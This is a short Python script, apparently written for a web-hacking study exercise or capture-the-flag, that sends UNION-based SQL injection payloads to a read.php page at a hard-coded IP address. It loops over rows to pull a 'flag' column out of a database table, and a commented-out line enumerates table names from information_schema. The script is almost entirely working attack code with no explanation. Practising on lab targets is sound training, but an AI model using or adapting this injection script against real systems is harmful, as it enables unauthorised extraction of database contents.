#-*- coding: utf-8 -*-
import requests
from bs4 import BeautifulSoup


url = "http://203.229.206.22/~wing608/webstudy/att/04/ver03/pages/read.php"


for i in range(1,20) : 
    data = {"num" : "6 union select 1,2,3,4,5,flag from fffllll444499999 limit "+str(i)+",1#"}
    #data = {"num" : "6 union select 1,2,3,4,5,table_name from information_schema.tables limit 1,1#"}
    
    res = requests.get(url,params=data)
    
    soup = BeautifulSoup(res.text, 'html.parser')
    res_tbody = soup.find_all("tbody") # tbody태그 안에 있는 값들 가져오기
    
    j=0
    for res_tr in res_tbody : #tbody - tr 태그
        for res_text in res_tr.find_all("tr") :  #tbody - tr 태그의 text 값들
            j = j+1
            if j == 3 : 
                print res_text.get_text()